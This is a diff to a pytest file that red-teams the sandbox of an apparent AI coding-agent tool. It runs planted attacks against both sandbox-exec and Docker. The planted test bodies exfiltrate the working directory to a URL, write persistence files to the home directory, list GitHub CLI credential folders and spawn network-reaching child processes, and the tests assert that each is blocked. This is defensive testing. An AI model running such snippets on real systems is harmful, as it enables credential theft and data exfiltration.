@@ -13,11 +13,23 @@ from pathlib import Path
 import pytest
 
 from devagent.guards import check_tool
-from devagent.security import os_sandbox_available, scan_files
+from devagent.security import DEFAULT_TEST_IMAGE, docker_available, docker_image_exists, os_sandbox_available, scan_files
 from devagent.tools.project_tools import run_tests
 
 needs_sandbox = pytest.mark.skipif(not os_sandbox_available(), reason="macOS sandbox-exec not available")
 PYTEST = f"{sys.executable} -m pytest -q -rf -p no:cacheprovider"
+
+# Every attack runs against every test sandbox this machine has: sandbox-exec (macOS) and Docker.
+SANDBOXES = [
+    pytest.param("sandbox-exec", marks=needs_sandbox),
+    pytest.param(
+        "docker",
+        marks=pytest.mark.skipif(
+            not (docker_available() and docker_image_exists(DEFAULT_TEST_IMAGE)),
+            reason="Docker or the devagent-tests image is not available (make docker-image)",
+        ),
+    ),
+]
 
 
 def plant_test(repo: Path, body: str) -> None:
@@ -28,45 +40,56 @@ def plant_test(repo: Path, body: str) -> None:
 
 
 # ---------------------------------------------------------------------------- attacks via planted test code
-@needs_sandbox
-def test_planted_test_cannot_exfiltrate_over_network(tmp_path):
+@pytest.mark.parametrize("sandbox", SANDBOXES)
+def test_planted_test_cannot_exfiltrate_over_network(tmp_path, sandbox):
     plant_test(tmp_path, "import os, urllib.request\nurllib.request.urlopen('https://example.com/?d=' + os.getcwd(), timeout=5)")
-    report = run_tests(tmp_path, PYTEST)
-    assert report.sandboxed and not report.passed
+    report = run_tests(tmp_path, PYTEST, sandbox=sandbox)
+    assert report.sandbox_kind == sandbox and not report.passed
     assert "URLError" in report.raw_tail or "Errno" in report.raw_tail
 
 
-@needs_sandbox
-def test_planted_test_cannot_persist_outside_repo(tmp_path):
+@pytest.mark.parametrize("sandbox", SANDBOXES)
+def test_planted_test_cannot_persist_outside_repo(tmp_path, sandbox):
     target = Path.home() / ".devagent_redteam_persistence"
     plant_test(tmp_path, f"open({str(target)!r}, 'w').write('pwned')")
-    report = run_tests(tmp_path, PYTEST)
+    report = run_tests(tmp_path, PYTEST, sandbox=sandbox)
     assert not report.passed and not target.exists()
 
 
-@needs_sandbox
-def test_planted_test_cannot_read_github_credentials(tmp_path):
+@pytest.mark.parametrize("sandbox", SANDBOXES)
+def test_planted_test_cannot_read_github_credentials(tmp_path, sandbox):
     gh_dir = Path.home() / ".config" / "gh"
     if not gh_dir.exists():
         pytest.skip("no gh config on this machine")
     plant_test(tmp_path, f"import os\nprint(os.listdir({str(gh_dir)!r}))")
-    report = run_tests(tmp_path, PYTEST)
-    assert not report.passed and "PermissionError" in report.raw_tail
+    report = run_tests(tmp_path, PYTEST, sandbox=sandbox)
+    # sandbox-exec denies the read; in Docker the folder doesn't exist at all
+    assert not report.passed and ("PermissionError" in report.raw_tail or "FileNotFoundError" in report.raw_tail)
 
 
-@needs_sandbox
-def test_planted_test_cannot_spawn_unsandboxed_child(tmp_path):
-    # Child processes inherit the sandbox: a nested shell still can't reach the network.
+@pytest.mark.parametrize("sandbox", SANDBOXES)
+def test_planted_test_cannot_spawn_unsandboxed_child(tmp_path, sandbox):
+    # Child processes inherit the sandbox: a nested Python still can't reach the network.
     plant_test(
-        tmp_path, "import subprocess\nassert subprocess.run(['curl', '-sS', '-m', '5', 'https://example.com']).returncode == 0"
+        tmp_path,
+        "import subprocess, sys\n"
+        "code = \"import urllib.request; urllib.request.urlopen('https://example.com', timeout=5)\"\n"
+        "assert subprocess.run([sys.executable, '-c', code]).returncode == 0",
     )
-    assert not run_tests(tmp_path, PYTEST).passed
+    assert not run_tests(tmp_path, PYTEST, sandbox=sandbox).passed
 
 
-@needs_sandbox
-def test_repo_writes_still_work(tmp_path):
+@pytest.mark.parametrize("sandbox", SANDBOXES)
+def test_planted_test_cannot_see_host_secrets(tmp_path, sandbox, monkeypatch):
+    monkeypatch.setenv("GH_TOKEN", "ghp_planted_secret_value")
+    plant_test(tmp_path, "import os\nassert 'GH_TOKEN' not in os.environ")
+    assert run_tests(tmp_path, PYTEST, sandbox=sandbox).passed
+
+
+@pytest.mark.parametrize("sandbox", SANDBOXES)
+def test_repo_writes_still_work(tmp_path, sandbox):
     plant_test(tmp_path, "open('output.txt', 'w').write('ok')")  # normal tests must keep working
-    assert run_tests(tmp_path, PYTEST).passed and (tmp_path / "output.txt").exists()
+    assert run_tests(tmp_path, PYTEST, sandbox=sandbox).passed and (tmp_path / "output.txt").exists()
 
 
 # ---------------------------------------------------------------------------- attacks the guard stops
